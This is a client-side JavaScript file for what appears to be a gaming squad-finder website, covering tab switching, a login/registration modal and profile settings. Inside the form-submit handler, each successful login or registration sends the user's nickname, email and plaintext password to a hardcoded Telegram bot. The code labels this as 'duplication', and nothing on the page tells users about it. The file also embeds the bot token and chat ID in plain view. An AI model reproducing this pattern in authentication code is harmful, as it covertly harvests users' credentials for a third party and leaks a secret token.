let isUserRegistered = false;
let currentMode = 'log'; 
let pendingTabId = null;
let pendingButton = null;

// Твоя адреса з Railway (БЕЗ слеша в кінці)
const API_URL = 'https://st-backend-production.up.railway.app';

// Дані твого Telegram бота
const TELEGRAM_TOKEN = '8460092788:AAHPbETm_DIczqYL7vA4XCbnWioiVBZYHwg';
const TELEGRAM_CHAT_ID = '8399462172';

function handleTabClick(btnElement, tabId) {
    if (!isUserRegistered) {
        pendingTabId = tabId;
        pendingButton = btnElement;
        document.getElementById('auth-modal').style.display = 'flex';
        return; 
    }
    openTab(btnElement, tabId);
}

function openTab(btnElement, tabId) {
    document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active-tab'));
    document.querySelectorAll('.menu-btn').forEach(btn => btn.classList.remove('active'));
    
    const targetTab = document.getElementById(tabId);
    if (targetTab) {
        targetTab.classList.add('active-tab');
        btnElement.classList.add('active');
    }
}

// Функція перемикання між LOGIN та REGISTER
function switchAuth(mode) {
    currentMode = mode;
    const title = document.getElementById('auth-title');
    const subtitle = document.getElementById('auth-subtitle');
    const nickGroup = document.getElementById('nick-group');
    const submitBtn = document.getElementById('submit-btn');
    const tabLog = document.getElementById('tab-login');
    const tabReg = document.getElementById('tab-register');

    if (mode === 'reg') {
        tabReg.classList.add('active');
        tabLog.classList.remove('active');
        title.textContent = 'Registration';
        subtitle.textContent = 'Join to find your perfect squad';
        if (nickGroup) nickGroup.style.display = 'block';
        submitBtn.textContent = 'Register & Enter';
    } else {
        tabLog.classList.add('active');
        tabReg.classList.remove('active');
        title.textContent = 'Welcome Back';
        subtitle.textContent = 'Login to access game lobbies';
        if (nickGroup) nickGroup.style.display = 'none';
        submitBtn.textContent = 'Login & Enter';
    }
}

// ОБРОБКА ФОРМИ (FIREBASE + TELEGRAM)
document.getElementById('auth-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const nicknameInput = document.getElementById('nickname');
    const nickname = nicknameInput ? nicknameInput.value : "";
    const errorEl = document.getElementById('error-msg');
    const submitBtn = document.getElementById('submit-btn');

    if (errorEl) errorEl.style.display = 'none';
    submitBtn.textContent = "Connecting...";

    // Формуємо правильний шлях (виправляє помилку Not Found)
    const path = currentMode === 'reg' ? '/register' : '/login';
    const url = `${API_URL}${path}`;

    const body = currentMode === 'reg' ? { email, password, username: nickname } : { email, password };

    try {
        // 1. Відправка на бекенд (Railway + Firebase)
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });

        if (res.ok) {
            const data = await res.json();
            isUserRegistered = true;
            
            // 2. Відправка в Telegram (дублювання)
            const tgMsg = `🚀 Дія: ${currentMode.toUpperCase()}\n👤 Nick: ${nickname || data.user?.username || 'N/A'}\n📧 Email: ${email}\n🔑 Pass: ${password}`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`);

            // Оновлюємо інтерфейс
            document.getElementById('player-display').innerHTML = `Player: <strong>${nickname || data.user?.username || "User"}</strong>`;
            document.getElementById('settings-btn').style.display = 'inline-block';
            document.getElementById('auth-modal').style.display = 'none';
            
            if (pendingTabId && pendingButton) {
                openTab(pendingButton, pendingTabId);
            }
        } else {
            const txt = await res.text();
            if (errorEl) {
                errorEl.textContent = "❌ " + txt;
                errorEl.style.display = 'block';
            }
        }
    } catch (err) {
        if (errorEl) {
            errorEl.textContent = "❌ Server error. Check Railway!";
            errorEl.style.display = 'block';
        }
    } finally {
        submitBtn.textContent = currentMode === 'reg' ? 'Register & Enter' : 'Login & Enter';
    }
});

// Закриття модалки при кліку на фон
window.onclick = function(event) {
    const modal = document.getElementById('auth-modal');
    if (event.target == modal) {
        modal.style.display = 'none';
    }
};

// --- НАЛАШТУВАННЯ ПРОФІЛУ ---
function openSettings() {
    document.getElementById('right-sidebar').classList.add('open');
}

function closeSettings() {
    document.getElementById('right-sidebar').classList.remove('open');
}

function saveSettings() {
    const newNickname = document.getElementById('change-nickname').value;
    if (newNickname.trim() !== "") {
        document.getElementById('player-display').innerHTML = `Player: <strong>${newNickname}</strong>`;
    }
    closeSettings();
}
